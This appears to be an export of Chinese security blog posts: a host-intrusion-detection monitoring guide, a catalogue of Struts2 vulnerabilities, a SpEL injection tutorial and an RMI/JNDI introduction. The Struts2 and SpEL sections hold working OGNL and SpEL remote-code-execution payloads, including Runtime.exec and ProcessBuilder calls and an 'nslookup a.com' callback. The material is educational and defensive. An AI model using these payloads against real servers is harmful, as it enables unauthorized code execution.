**sudoers信息：**解析`/etc/sudoers`和`/etc/sudoers.d/`目录下的文件\n\n- **iptables信息：**解析`/proc/net/ip_tables_names`文件\n\n- **系统控制文件：**解析系统控制配置文件\n\n  - 系统文件路径：`/etc/sysct.conf`\n\n  - 系统控制文件可能存在路径\n\n    ```c++\n    \"/run/sysctl.d/%.conf\",           \n    \"/etc/sysctl.d/%.conf\",\n    \"/usr/local/lib/sysctl.d/%.conf\", \n    \"/usr/lib/sysctl.d/%.conf\",\n    \"/lib/sysctl.d/%.conf\",\n    ```\n\n- **其他信息（非完整）：**\n\n  - **memory_map：**解析`/proc/iomem`\n  - **mounts：**解析`/proc/mounts`\n  - **modules：**解析`/proc/modules`\n  - **memory_info：**解析`/proc/meminfo`\n  - **shared_memory：**通过`shmctl`函数遍历merory id从1遍历到最大\n  - **uptime：**通过`sysctl`函数获取boottime\n\n## 重要文件监控\n\n这项功能实现很简单，就是定时计算整个目录下文件或者单个的Hash值并存储起来。但是哪些文件属于重要文件就需要安全人员去研究定义，这个过程可能不是一蹴而就，一方面可能新的漏洞层出不穷，一方面是受限于个人的知识点有限，无法梳理出所有通用的漏洞策略。以下是一些我的不完全整理：\n\n- **`/bin/ps`、`/bin/netstat`、`/usr/sbin/lsof`、`/usr/bin/top`等命令：**rookit时候hacker可能会替换这些系统命令\n\n- **libc.so文件：**ubuntu平台`/usr/lib/x86_64-linux-gnu/libc.so`，centos平台`/lib64/libc.so.6`。查看某个平台具体的libc.so文件路径，可以运行`ldd ls | grep libc.so`。\n\n- **开机启动文件：**\n\n  - /etc/init.d是 /etc/rc.d/init.d 的软链接，测试新装的linux系统必须开启的服务\n\n    `ssd、rsyslog、network、crond`\n\n  - [/etc/rc.local](https://common.cnblogs.com/editor/tiny_mce/plugins/preview/  https://www.landui.com/help/nshow-8196.html  )\n\n    - 基于白名单过滤，查找异常的执行命令\n\n    - 基于已知的特征做数量统计或异常行为分析。\n\n- **/etc/profile文件：**本文件可设置全局的系统变量。\n\n- **内核模块：** `ls -alt /sys/module`\n\n- **预加载文件：**`/etc/ld.so.preload`\n\n- **suid文件监控：**全局搜索是不太现实，一般服务器负载都比较高，全局搜索耗时和对系统负担大。\n\n  ```c++\n  \"/bin\",           \n  \"/sbin\",           \n  \"/usr/bin\", \n  \"/usr/sbin\",\n  \"/usr/local/bin\", \n  \"/usr/local/sbin\", \n  \"/tmp\",\n  ```\n\n  搜索上述几个路径的文件，判断权限是[suid和guid](https://www.cnblogs.com/sparkdev/p/9651622.html)\n\n## 日志搜集\n\n- **/var/log/secure：**Linux系统的安全日志，记录用户和工作组变化情况、用户登陆认证情况。一般入侵告警ssh被尝试爆破就是通过这个文件来进行规则制定的。\n- **/var/log/wtmp：**该日志文件永久记录每个用户登录、注销及系统的启动、停机的事件，这个文件是二进制文件，cat查看不了，可以使用last命令查看。此文件可用于异常用户登录检测，通过检测异常的IP和登录地进行告警。\n- **history日志：**监控用户输入的历史命令，后续会讲到具体做法。\n- **webserver日志：**主要用于应急响应或者做些cc攻击的防御，是否集成到HIDS里有待商榷。定位到日志的具体路径是难点，做简单的cc攻击防御的话，最简单可以通过ip时间段内访问频率来设置防御策略。\n\n \n\n**参考：**\n\nhttps://www.freebuf.com/articles/es/197337.html\n\nhttps://www.freebuf.com/articles/es/194510.html\n\n![img](https://common.cnblogs.com/editor/tiny_mce/themes/advanced/img/trans.gif)","tags":["反入侵","基础信息搜集"],"categories":["反入侵策略"]},{"title":"Struts2历史漏洞总结","url":"/2019/03/23/Struts2历史漏洞总结/","content":"# 前言\n\n本文章不分析各个漏洞的具体原理了，这篇文章https://www.freebuf.com/vuls/217482.html已经归纳了struts2历史漏洞的分析。大部分漏洞都是因为执行了ongl表达式造成的，关于ognl前一篇文章也做了详细的介绍。我就做简单的归纳，以及选代表漏洞做具体的调试过程。\n\n# strust2漏洞简要分析\n\n## S2-001\n\n**适用版本：**2.0.0 – 2.0.8\n\n**POC:**\n\n```java\n%{@java.lang.Runtime@getRuntime().exec(\"open /Applications/Calculator.app/\")}\n```\n\n**简单原理：**\n\n没有任何过滤。struts2用来处理传入参数以及request中各项参数的值栈OgnlValueStack在进行取值的时候，就会去调用ognl的getValue参数，从而造成命令执行。\n\n## S2-003\n\n**适用版本：**2.0.0 – 2.1.8.1\n\n**POC：**\n\n```java\nhttp://www.glassy.com/test.action?('\\u0023context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\u003dfalse')(a)(b)&('\\u0040java.lang.Runtime@getRuntime().exec(\\'open\\u0020/Applications/Notes.app/\\')')(a)(b)\n```\n\n**简单原理**：\n\nOgnl.setValue同意具有执行java代码的能力，S2-003就是利用了**Ognl.setValue**的执行java代码的能力造成的RCE。需要构造ASTEval语法树：\n\n```java\nOgnlContext context = new OgnlContext();\nOgnl.setValue(\"(\\\"@java.lang.Runtime@getRuntime().exec(\\'open /Applications/Calculator.app/\\')\\\")(glassy)(amadeus)\",context,\"\");\n```\n\n## S2-005\n\n**适用版本：**2.0.0 – 2.1.8.1\n\n**POC:**\n\n```java\nhttp://www.glassy.com/test.action?('\\u0023context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\u003dfalse')(a)(b)&('\\u0023_memberAccess.excludeProperties\\u003d@java.util.Collections@EMPTY_SET')(a)(b)&('\\u0023_memberAccess.allowStaticMethodAccess\\u003dfalse')(a)(b)&('\\u0040java.lang.Runtime@getRuntime().exec(\\'open\\u0020/Applications/Notes.app/\\')')(a)(b)\n```\n\n**简单原理：**\n\nS2-005就是对于S2-003的绕过，从上面的修复可以看到，补丁的关键部分在于通过对**securityMemberAccess的两个成员变量allowStaticMethodAccess和excludeProperties对OGNL表达式能否加载函数**，然而通过OGNL表达式，我们可以改写这两个变量的值（和denyMethodExecution是一个套路），来实现补丁的绕过。\n\n## S2-007\n\n**适用版本：**2.0.0 – 2.2.3\n\n提交的参数配置了验证规则并对提交的参数进行类型转换的时候会造成OGNL表达式的执行，具体是由ConversionErrorInterceptor拦截器触发的。\n\n## S2-009\n\n**适用版本：**2.0.0 – 2.3.1.1\n\nS2-009其实就是对003和005的绕过。\n\n**简单原理：**\n\n```java\nOgnlContext context = new OgnlContext();\nOgnl.setValue(\"password\",context,\"@java.lang.Runtime@getRuntime().exec('open /Applications/Notes.app/')(glassy)\");\nOgnl.setValue(\"a[(password)(glassy)]\",context,\"true\");\n```\n\n第一行代码用于将password-payload的map写入ognl的root中去，第二行代码中的a[(password)(glassy)]在AST树中进行解析的时候按照从右到左，从里到外的顺序进行解析，因此优先解析(password)(glassy),password的值在root中有（password-payload），于是解析成了payload(glassy)的形式，然后就是和ST2-003一样的原理造成了RCE了。\n\n## S2-012\n\n**适用版本：**Struts Showcase 2.0.0 – Struts Showcase 2.3.14.2\n\n**POC:**\n\n```java\n%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{\"/bin/bash\", \"-c\", \"open /Applications/Notes.app/\"})).start()}\n```\n\n**简单原理：**\n\n造成这个RCE的问题出在了重定向上，当需要从ST2的值栈中读取数据作为重定向的参数，而这个值又是前端可控的情况下可以造成RCE。注意：\n\n这次的poc没有使用Runtime类而改用了ProcessBuilder类，这个类有一个优势，**它不是静态类，命令执行的时候调用的start方法也不是静态方法，不受OgnlValueStack类的allowStaticMethodAccess值的限制。**\n\n## S2-013\n\n**适用版本：**2.0.0 – 2.3.14.1\n\n**简单原理：**\n\njsp通过s:url或s:a标签来动态生成跳转的action的时候，如果想把jsp里面的参数带到action的后面，就需要配置includeParams，这样的话服务端就会先去拿到jsp的参数，并带到ST2的ognl里面计算一下这个参数再去拼接到action后面，从而造成了rce。\n\n## S2-015\n\n**适用版本：**2.0.0 – 2.3.14.2\n\n使用通配符*来做action映射的时候会导致问题。\n\n```xml\n<action name=\"*\" class=\"example.ExampleSupport\">\n    <result>/example/{1}.jsp</result>\n</action>\n```\n\nST2处理通配符配置的action映射的时候流程是这样的：如果一个请求的action在映射中不存在，那么就会去匹配通配符，ST2会根据请求的action名来加载对应的jsp文件。以上面的配置为例子，当请求一个struts.xml中不存在的test.action的时候，ST2就会去吧/example/test.jsp的内容返回给前端。\n\n## S2-016\n\n**适用版本：**2.0.0 – 2.3.15\n\n**POC:**\n\n```java\nhttp://www.glassy.com/Struts2Demo_war_exploded/hello.action?redirect:%24%7b%23a%3d(new+java.lang.ProcessBuilder(new+java.lang.String%5b%5d%7b%27%2fbin%2fbash%27%2c+%27-c%27%2c%27open+%2fApplications%2fNotes.app%2f%27%7d)).start()%7d\n```\n\n**简单原理：**\n\nST2使用action:或redirect:\\redirectAction:作为前缀参数来进行短路导航状态变化，后面的语句会直接进行ognl表达式计算。\n\n##S2-019\n\n**适用版本：**2.0.0 – 2.3.15.1\n\n**POC:**\n\n```java\nhttp://www.glassy.com/Struts2Demo_war_exploded/hello.action?debug=command&expression=%23a%3d(new+java.lang.ProcessBuilder(%27open+%2fApplications%2fNotes.app%2f%27)).start()\n```\n\n**简单原理：**\n\n当struts2开启求开发者模式时候，可以直接远程通过debug参数获取调试模式，如果模式是command，则把expression参数放到stack.findValue中，最终放到了ognl.getValue中。\n\n## S2-029\n\n**适用版本：**2.0.0 – 2.3.24.1 (不包括2.3.20.3)\n\n## S2-032\n\n**适用版本：2.3.20 – 2.3.28**（2.3.20.3和2.3.24.3除外）\n\n## S2-032\n\n**适用版本：2.3.20 – 2.3.28（2.3.20.3和2.3.24.3除外）**\n\n**POC**\n\n```java\nhttp://www.glassy.com/struts2-showcase/home11.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D),d&cmd=/Applications/Notes.app/Contents/MacOS/Notes\n```\n\n**简单原理：**\n\n这个版本漏洞要求在struts.xml中将DynamicMethodInvocation设置为true才能利用成功。（低版本ST2的DynamicMethodInvocation默认为true，高版本默认为false）\n\n```\n<constant name=\"struts.enable.DynamicMethodInvocation\" value=\"true\" />\n```\n\n当所有的interceptors调用完成后，计算返回码的时候，ST2就开始去计算我们最初传过来的method：后面的值，从而把内容放进了ognl.getValue，造成了RCE。\n\n## S2-045\n\n**适用版本：**2.3.5 – 2.3.31, 2.5 – 2.5.10\n\n**POC:**\n\n```java\nContent-Type:%{(#glassy='multipart/form-data').(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#a=(new java.lang.ProcessBuilder('/Applications/Notes.app/Contents/MacOS/Notes')).start())}\n```\n\n**简单原理：**\n\nST2收到的request包包含Content-Type，并且Content-Type中包含“multipart/form-data”的时候会把请求交给MultiPartRequestWrapper处理，经过几个函数后，报错的信息被传入了TextParseUtil.translateVariables，translateVariables会在后续的调用中将报错信息中用%{}包裹的内容带入ognl.getValue。\n\n## S2-046\n\n同s2-045\n\n## S2-048\n\n**适用版本：**使用了Struts 1 plugin 和Struts 1 action 的2.3.x 版本\n\n得使用到struts1，条件苛刻，不具体分析，有兴趣看freebuf的详细分析\n\n## S2-053\n\n**适用版本：**2.0.0 – 2.3.33 , 2.5 – 2.5.10.1\n\n**POC：**\n\n```java\nhttp://www.glassy.com/Struts2Demo_war_exploded/s2053.action?name=%25%7b(%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23a%3d(new+java.lang.ProcessBuilder(%27%2fApplications%2fNotes.app%2fContents%2fMacOS%2fNotes%27)).start())%7d\n```\n\n**简单原理：**\n\n053版本的利用条件也比较苛刻，只有服务端将用户可控的参数放到了Freemarker的标签属性中的时候，才会造成RCE，实例写法如下，\n\n```java\n<@s.url value=\"${name}\"/>\n```\n\n当name参数是客户端传过来的时候，就会在ST2服务器上造成RCE。st2看到返回的页面是Freemarker模板的，所以交给FreemarkerResult类处理，Freemarker在处理的时候需要去找name的值以便生成完整的标签，于是通过ST2去findString，发现name参数是ognl表达式，于是交给了ognl.getValue，造成了rce。\n\n## 漏洞总结\n\n| 漏洞名称 | 命令注入位置                               | OGNL执行函数  | 漏洞成因                                                     |\n| :------- | :----------------------------------------- | :------------ | :----------------------------------------------------------- |\n| S2-001   | 参数值                                     | Ognl.getValue | 当参数值是形如%{*}的形式的时候，ST2会把这个值当做OGNL表达式去执行。 |\n| S2-003   | 参数名                                     | Ognl.setValue | 通过构造形如(exp)(a)(b)的形式的表达式，放入ognl.setvalue，最终会将exp带入ognl.getvalue |\n| S2-005   | 参数名                                     | Ognl.setValue | S2-003的绕过，通过ognl表达式，可以对ognl的root、context中的值做任意修改，从而绕过基于定义变量值的补丁 |\n| S2-007   | 参数值                                     | Ognl.getValue | 当对参数做了类型限制，而类型转换出错的时候，ST2会把出错的参数值带入Ognl.getValue |\n| S2-009   | 参数值和参数名的配合                       | Ognl.setValue | 003和005的绕过通过构造一个带有payload的值a传给ognl，再通过把(b)(a)带如ognl.setvalue从而造成和005一样的rce |\n| S2-012   | 重定向参数                                 | Ognl.getValue | 计算重定向url的时候会把重定向参数的值放入ognl.getvalue中     |\n| S2-013   | 使用特殊s:url或者s:a标签的action的参数值   | Ognl.getValue | 计算标签中action路径的时候，会把参数值带入ognl.getvalue      |\n| S2-015   | action值                                   | Ognl.getValue | 计算重定向url的时候会把action的值放入ognl.getvalue中         |\n| S2-016   | action:或redirect:\\redirectAction:后面的值 | Ognl.getValue | 同012                                                        |\n| S2-019   | debug和expression的参数值                  | Ognl.getValue | ST2开启调试模式的时候，自带的可以执行ognl表达式的功能        |\n| S2-029   | 写入jsp中st2标签特殊属性值中的参数值       | Ognl.getValue | 返回给前端的jsp中的st2标签的属性值是形如%{exp}的形式的时候，会把exp放入ognl.getvalue |\n| S2-032   | method:后的参数值                          | Ognl.getValue | 计算返回结果的时候，ST2就开始去计传过来的method：后面的值，从而把内容放进了ognl.getValue |\n| S2-045   | Content-Type的值                           | Ognl.getValue | ST2在处理上传文件出错的时候且错误信息中带%{exp}的时候，会把exp带入ognl.getValue |\n| S2-048   | 传入ActionMessage的key中的参数值           | Ognl.getValue | ST2处理ST1的action的时候会把ActionMessage的key传给ognl.getValue |\n| S2-053   | Freemarker的标签属性中的参数值             | Ognl.getValue | 计算Freemarker的标签属性值的时候会参数的值放入ognl.getvalue中 |\n\n# strust2漏洞调试\n\nhttps://github.com/proudwind/struts2_vulns这个地址是struts2漏洞调试环境。\n\n需要注意都是部署环境的时候，你要测试哪个漏洞就要修改pom.xml的struts2-core版本为相应漏洞的版本，另外struts2的filter-class也需要做相应的修改。\n\n## Struts2 001漏洞调试\n\n先放着，后面补\n\n## Strust2 003漏洞调试\n\n先放着，后面补\n\n\n\n**参考：**\n\nhttps://seaii-blog.com/index.php/2019/12/29/90.html\n\nhttps://www.freebuf.com/vuls/217482.html","tags":["Strusts2","Ongl"],"categories":["JAVA安全教程"]},{"title":"SPEL漏洞解析","url":"/2019/03/20/SPEL漏洞解析/","content":"\n# 什么是SPEL\n\nSpring表达式语言全称为“Spring Expression Language”，缩写为“SpEL”，他能在运行时构建复杂表达式、存取对象属性、对象方法调用等等，并且能与 Spring 功能完美整合。表达式语言给静态 Java 语言增加了动态的功能，表达式语言是单独的模块，他只依赖与核心的模块，不依赖与其他模块，能够单独的使用。\n\n因为 Spring 框架的广泛使用，Spel 表达式的应用也十分的广泛。\n\n就安全领域而言，我们只要使用的是 #this 变量、[] 获取属性和 T 运算符，#this 变量用于引用当前评估对象，T 运算符可以用于指定 java.lang.Class 的实例，对 java.lang 中的对象的 T 引用不需要完整的包名，但引用所有其他对象时是需要的。 \n\n## **SpEL 表达式**\n\n### 基本表达式\n\n字面量表达式、关系，逻辑与算数运算表达式、字符串链接及截取表达式、三目运算、正则表达式以及括号优先级表达式；\n\n### 类相关表达式\n\n类类型表达式、类实例化、instanceof 表达式、变量定义及引用、赋值表达式、自定义函数、对象属性存取及安全导航表达式、对象方法调用、Bean 引用；\n\n### 集合相关表达式\n\n内联 List、内联数组、集合、字典访问、列表、字典；\n\n### 其他表达式\n\n模版表达式\n\n# SpEL 基础\n\n在 pom.xml 导入 maven 或是把”org.springframework.expression-3.0.5.RELEASE.jar”添加到类路径中\n\n```xml\n<properties>\n    <org.springframework.version>5.0.8.RELEASE</org.springframework.version>\n</properties>\n<dependency>\n      <groupId>org.springframework</groupId>\n      <artifactId>spring-expression</artifactId>\n      <version>${org.springframework.version}</version>\n</dependency>\n```\n\n## SpEL 使用方式\n\n1. XML配置\n\n   ```xml\n   <bean id=\"numberGuess\" class=\"org.spring.samples.NumberGuess\">\n       <property name=\"randomNumber\" value=\"#{ T(java.lang.Math).random() * 100.0 }\"/>\n       <!-- other properties -->\n   </bean>\n   ```\n\n2. 基于注解的使用\n\n   ```java\n   public class EmailSender {\n       @Value(\"${spring.mail.username}\")\n       private String mailUsername;\n       @Value(\"#{ systemProperties['user.region'] }\")    \n       private String defaultLocale;\n       //...\n   }\n   ```\n\n3. 代码里直接使用\n\n   SpEL 在求表达式值时一般分为四步，其中第三步可选：首先构造一个解析器，其次解析器解析字符串表达式，在此构造上下文，最后根据上下文得到表达式运算后的值。\n\n   ```java\n   ExpressionParser parser = new SpelExpressionParser();\n   Expression expression = parser.parseExpression(\"('Hello' + 'world').concat(#end)\");\n   EvaluationContext context = new StandardEvaluationContext();\n   context.setVariable(\"end\", \"!\");\n   System.out.println(expression.getValue(context));\n   ```\n\n   最后是**expression.getValue()**执行表达式\n\n   1.  **创建解析器：**SpEL 使用 ExpressionParser 接口表示解析器，提供 SpelExpressionParser 默认实现；\n   2. **解析表达式：**使用 ExpressionParser 的 parseExpression 来解析相应的表达式为 Expression 对象。\n   3. **构造上下文：**准备比如变量定义等等表达式需要的上下文数据。\n   4. **求值：**通过 Expression 接口的 getValue 方法根据上下文获得表达式值。\n\n## SpEL 主要接口\n\n1.**ExpressionParser 接口**：表示解析器，默认实现是 org.springframework.expression.spel.standard 包中的 SpelExpressionParser 类，使用 parseExpression 方法将字符串表达式转换为 Expression 对象，对于 ParserContext 接口用于定义字符串表达式是不是模板，及模板开始与结束字符；\n\n```java\npublic interface ExpressionParser {  \n    Expression parseExpression(String expressionString);  \n    Expression parseExpression(String expressionString, ParserContext context);  \n}\n```\n\n实例：\n\n```java\nExpressionParser parser = new SpelExpressionParser();\nParserContext parserContext = new ParserContext() {\n    @Override\n    public boolean isTemplate() {\n    return true;\n    }\n    @Override\n    public String getExpressionPrefix() {\n    return \"#{\";\n    }\n    @Override\n    public String getExpressionSuffix() {\n    return \"}\";\n    }\n};\nString template = \"#{'hello '}#{'world!'}\";\nExpression expression = parser.parseExpression(template, parserContext);\nSystem.out.println(expression.getValue());\n```\n\n**EvaluationContext 接口**：表示上下文环境，默认实现是 org.springframework.expression.spel.support 包中的 StandardEvaluationContext 类，使用 setRootObject 方法来设置根对象，使用 setVariable 方法来注册自定义变量，使用 registerFunction 来注册自定义函数等等。\n\n**Expression 接口**：表示表达式对象，默认实现是 org.springframework.expression.spel.standard 包中的 SpelExpression，提供 getValue 方法用于获取表达式值，提供 setValue 方法用于设置对象值。\n\n## SpEL 类相关表达式\n\n**其中表达式支持非常多的语法，能够造成代码执行的有以下2种：**\n\n1. **类类型表达式**\n   类类型表达式：使用“T(Type)”来表示java.lang.Class实例，“Type”必须是类全限定名，“java.lang”包除外，即该包下的类可以不指定包名；使用类类型表达式还可以进行访问类静态方法及类静态字段。\n\n   ```java\n   ExpressionParser parser = new SpelExpressionParser();\n           \n   // java.lang 包类访问\n   Class<String> result1 = parser.parseExpression(\"T(String)\").getValue(Class.class);\n   System.out.println(result1);\n   \n   //其他包类访问\n   String expression2 = \"T(java.lang.Runtime).getRuntime().exec('open /Applications/Calculator.app')\";\n   Class<Object> result2 = parser.parseExpression(expression2).getValue(Class.class);\n   System.out.println(result2);\n           \n   //类静态字段访问\n   int result3 = parser.parseExpression(\"T(Integer).MAX_VALUE\").getValue(int.class);\n   System.out.println(result3);\n           \n   //类静态方法调用\n   int result4 = parser.parseExpression(\"T(Integer).parseInt('1')\").getValue(int.class);\n   System.out.println(result4);\n   ```\n\n2. **类实例化表达式**\n   类实例化同样使用java关键字“new”，类名必须是全限定名，但java.lang包内的类型除外，如String、Integer。 \n\n   ```java\n   ExpressionParser parser = new SpelExpressionParser();\n   Expression exp = parser.parseExpression(\"new java.util.Date()\");\n   Date value = (Date) exp.getValue();\n   System.out.println(value);\n   ```\n\n# 审计关键点\n\n- org.springframework.expression.spel.standard\n\n- SpelExpressionParser\n- expression.getValue\n- expression.setValue\n\n# 常用payload\n\n```java\n${12*12}\nT(java.lang.Runtime).getRuntime().exec(\"nslookup a.com\")\nT(Thread).sleep(10000)\n#this.getClass().forName('java.lang.Runtime').getRuntime().exec('nslookup a.com')\nnew java.lang.ProcessBuilder({'nslookup a.com'}).start()\n```\n\n# CVE漏洞简析\n\n## SpringBoot SpEL表达式注入漏洞\n\n**影响版本：**1.1.0-1.1.12、1.2.0-1.2.7、1.3.0\n\n其造成的原因主要是在 `ErrorMvcAutoConfiguration.java` 中的 `SpelView` 类:\n\n```java\nprivate static class SpelView implements View {\n        private final String template;\n        private final StandardEvaluationContext context = new StandardEvaluationContext();\n        private PropertyPlaceholderHelper helper;\n        private PlaceholderResolver resolver;\n \n        public SpelView(String template) {\n            this.template = template;\n            this.context.addPropertyAccessor(new MapAccessor());\n            this.helper = new PropertyPlaceholderHelper(\"${\", \"}\");\n            this.resolver = new ErrorMvcAutoConfiguration.SpelPlaceholderResolver(this.context);\n        }\n \n        public String getContentType() {\n            return \"text/html\";\n        }\n \n        public void render(Map<String, ?> model, HttpServletRequest request, HttpServletResponse response) throws Exception {\n            if(response.getContentType() == null) {\n                response.setContentType(this.getContentType());\n            }\n \n            Map<String, Object> map = new HashMap(model);\n            map.put(\"path\", request.getContextPath());\n            this.context.setRootObject(map);\n            String result = this.helper.replacePlaceholders(this.template, this.resolver);\n            response.getWriter().append(result);\n        }\n    }\n```\n\n大致流程为 `PropertyPlaceholderHelper` 类中通过 `parseStringValue` 方法递归字符串找到目标去掉 `$()` ，这个方法中调用 `resolvePlaceholder` 方法来在 `context` 中找到对应的 `name` ，并在这里执行了 `getValue` 操作。由此造成命令执行。代码如下：\n\n```java\npublic String resolvePlaceholder(String name) {\n        Expression expression = this.parser.parseExpression(name);\n \n        try {\n            Object value = expression.getValue(this.context);\n            return HtmlUtils.htmlEscape(value == null?null:value.toString());\n        } catch (Exception var4) {\n            return null;\n        }\n    }\n```\n\n其核心思想就是在递归中从 `context` 下的 `message` 中取出需要再次递归解析的 `$(payload)` ，由此来在下一次的解析后去掉 `$()` 并把其中 `payload` 当作传入的 `name` 参数来执行 `getValue` 操作。\n\n## Spring Data Commons远程代码执行漏洞（CVE-2018-1273）\n\n**影响版本：**1.13-1.13.10、2.0-2.0.5\n\n漏洞形成的原因就是当用户在开发中利用了Spring-data-commons中的特性对用户的输入参数进行自动匹配时候，会将用户提交的form表单中的参数名作为SpEL执行。\n\n**漏洞代码：**\n\n```java\nprivate static class MapPropertyAccessor extends AbstractPropertyAccessor {\n       public void setPropertyValue(String propertyName, @Nullable Object value) throws BeansException {\n           if (!this.isWritableProperty(propertyName)) {\n               throw new NotWritablePropertyException(this.type, propertyName);\n           } else {\n               StandardEvaluationContext context = new StandardEvaluationContext();\n               context.addPropertyAccessor(new MapDataBinder.MapPropertyAccessor.PropertyTraversingMapAccessor(this.type, this.conversionService));\n               context.setTypeConverter(new StandardTypeConverter(this.conversionService));\n               context.setRootObject(this.map);\n               Expression expression = PARSER.parseExpression(propertyName);\n               PropertyPath leafProperty = this.getPropertyPath(propertyName).getLeafProperty();\n               TypeInformation<?> owningType = leafProperty.getOwningType();\n               TypeInformation<?> propertyType = leafProperty.getTypeInformation();\n               propertyType = propertyName.endsWith(\"]\") ? propertyType.getActualType() : propertyType;\n               if (propertyType != null && this.conversionRequired(value, propertyType.getType())) {\n                   PropertyDescriptor descriptor = BeanUtils.getPropertyDescriptor(owningType.getType(), leafProperty.getSegment());\n                   if (descriptor == null) {\n                       throw new IllegalStateException(String.format(\"Couldn't find PropertyDescriptor for %s on %s!\", leafProperty.getSegment(), owningType.getType()));\n                   }\n                   MethodParameter methodParameter = new MethodParameter(descriptor.getReadMethod(), -1);\n                   TypeDescriptor typeDescriptor = TypeDescriptor.nested(methodParameter, 0);\n                   if (typeDescriptor == null) {\n                       throw new IllegalStateException(String.format(\"Couldn't obtain type descriptor for method parameter %s!\", methodParameter));\n                   }\n                   value = this.conversionService.convert(value, TypeDescriptor.forObject(value), typeDescriptor);\n               }\n               expression.setValue(context, value);\n           }\n       }\n```\n\n**开发者使用如下代码：**\n\n```java\n@RequestMapping(method = RequestMethod.POST)\npublic Object register(UserForm userForm, BindingResult binding, Model model) {\n \n        userForm.validate(binding, userManagement);\n        if (binding.hasErrors()) {\n            return \"users\";\n        }\n \n        userManagement.register(new Username(userForm.getUsername()), Password.raw(userForm.getPassword()));\n \n        RedirectView redirectView = new RedirectView(\"redirect:/users\");\n        redirectView.setPropagateQueryParams(true);\n \n        return redirectView;\n   }\n```\n\n其流程简单上说就是在获取POST过来的参数时候因为要自动绑定进入实体类，所以首先要通过 `isWritableProperty` 中调用的 `getPropertyPath` 来判断参数名。如:传来的username参数是否是开发者controller中接收的 `UserForm` 实体类里的一个属性名。然后把用户传入的参数key即 `propertyName` 进行 `PARSER.parseExpression(propertyName)` ，最后 `setValue(context,value)` 触发了恶意代码。\n\n# 防御方式\n\n因为SpEL表达式注入漏洞导致攻击者可以通过表达式执行精心构造的任意代码，导致命令执行。为了防御该类漏洞，Spring官方推出了 `SimpleEvaluationContext` 作为安全类来防御该类漏洞。\n\n\n\n**参考：**\n\nhttps://www.codercto.com/a/55517.html\n\nhttps://www.freebuf.com/vuls/197008.html\n\nhttps://www.jianshu.com/p/ce4ac733a4b9","tags":["JAVA","SPEL"],"categories":["JAVA安全教程"]},{"title":"JAVA RMI和JDNI简介","url":"/2019/03/16/JAVA-RMI和JDNI简介/","content":"# 什么是RMI和JNDI\n\nJava RMI（Java Remote Method Invocation），即Java远程方法调用。是Java编程语言里，一种用于实现远程过程调用的应用程序**编程接口**。RMI 使用 **JRMP（Java Remote Message Protocol，Java远程消息交换协议**）实现，使得客户端运行的程序可以调用远程服务器上的对象。是实现RPC的一种方式。\n\nJava Naming and Directory Interface (JDNI)名为 Java命名和目录接口，，简单来说就是 JNDI 提供了**一组通用的接口**可供应用很方便地去访问不同的后端服务，例如 LDAP、RMI、CORBA 等。\n\nJNDA和RMI的关系可以粗浅的理解为url和http的关系：\n\n- JNDI：类比url，提供访问的地址\n\n- RMI：类比http，是url中使用的协议。\n\n# RMI 的使用\n\n1、server端：创建远程对象，并注册远程对象\n\n```java\n//定义远程对象的接口\npublic interface HelloService extends Remote {\n    String say() throws RemoteException;\n}\n\n//接口的实现\npublic class HelloServiceImpl extends UnicastRemoteObject implements HelloService {\n    public HelloServiceImpl() throws RemoteException{\n        super();\n    }\n\n    @Override\n    public String say() throws RemoteException {\n        return \"Hello\";\n    }\n}\n\n//注册远程对象\npublic class Service {\n    public static void main(String[] args) throws RemoteException, AlreadyBoundException, MalformedURLException {\n        HelloServiceImpl helloService = new HelloServiceImpl();\n        LocateRegistry.createRegistry(1099);\n        Naming.bind(\"rmi://127.0.0.1/hello\",helloService);\n    }\n}\n```\n\n2、client端：查找远程对象，调用远程方法\n\n```java\npublic class Client {\n    public static void main(String[] args) throws RemoteException, NotBoundException, MalformedURLException {\n        HelloService helloService = (HelloService) Naming.lookup(\"rmi://127.0.0.1/hello\");\n        System.out.println(helloService.say());\n    }\n}\n```\n\n# RMI 的原理\n\nRMI本质是TCP网络通信，内部封装了序列化和通信过程，使用代理实现接口调用。\n\n**几个重要知识点：**\n\n1. RMI的传输是基于反序列化的。\n2. 对于任何一个以对象为参数的RMI接口，你都可以发一个自己构建的对象，迫使服务器端将这个对象按任何一个存在于服务端classpath（不在classpath的情况，可以看后面RMI动态加载类相关部分）中的可序列化类来反序列化恢复对象。\n\n### 调用过程\n\n![image-20200216203005799](/images/a9/1.png)\n\n1. Server端监听一个端口，这个端口是JVM随机选择的；\n2. Client端并不知道Server远程对象的通信地址和端口，但是Stub中包含了这些信息，并封装了底层网络操作；\n3. Client端可以调用Stub上的方法；\n4. Stub连接到Server端监听的通信端口并提交参数；\n5. 远程Server端上执行具体的方法，并返回结果给Stub；\n6. Stub返回执行结果给Client端，从Client看来就好像是Stub在本地执行了这个方法一样；\n\n### 获取Stub\n\n假设Stub可以通过调用某个远程服务上的方法向远程服务来获取，但是调用远程方法又必须先有远程对象的Stub，所以这里有个死循环问题。JDK提供了一个RMI注册表（RMIRegistry）来解决这个问题。RMIRegistry也是一个远程对象，默认监听在传说中的**1099端口**上，可以使用代码启动RMIRegistry，也可以使用rmiregistry命令。\n\n![img](/images/a9/2.png)\n\n所以从客户端角度看，服务端应用是有两个端口的，**一个是RMI Registry端口（默认为1099），另一个是远程对象的通信端口（随机分配的）**，通常我们只需要知道Registry的端口就行了，Server的端口包含在了Stub中。RMI Registry可以和Server端在一台服务器上，也可以在另一台服务器上，不过大多数时候在同一台服务器上且运行在同一JVM环境下。\n\n# 动态加载类\n\nRMI核心特点之一就是动态类加载，如果当前JVM中没有某个类的定义，它可以从远程URL去下载这个类的class，动态加载的对象class文件可以使用Web服务的方式进行托管。这可以动态的扩展远程应用的功能，RMI注册表上可以动态的加载绑定多个RMI应用。对于客户端而言，服务端返回值也可能是一些子类的对象实例，而客户端并没有这些子类的class文件，如果需要客户端正确调用这些子类中被重写的方法，则同样需要有运行时动态加载额外类的能力。客户端使用了与RMI注册表相同的机制。RMI服务端将URL传递给客户端，客户端通过HTTP请求下载这些类。\n\n![动态加载类](/images/a9/3.png)\n\n# Weblogic RMI\n\nT3传输协议是WebLogic的自有协议，Weblogic 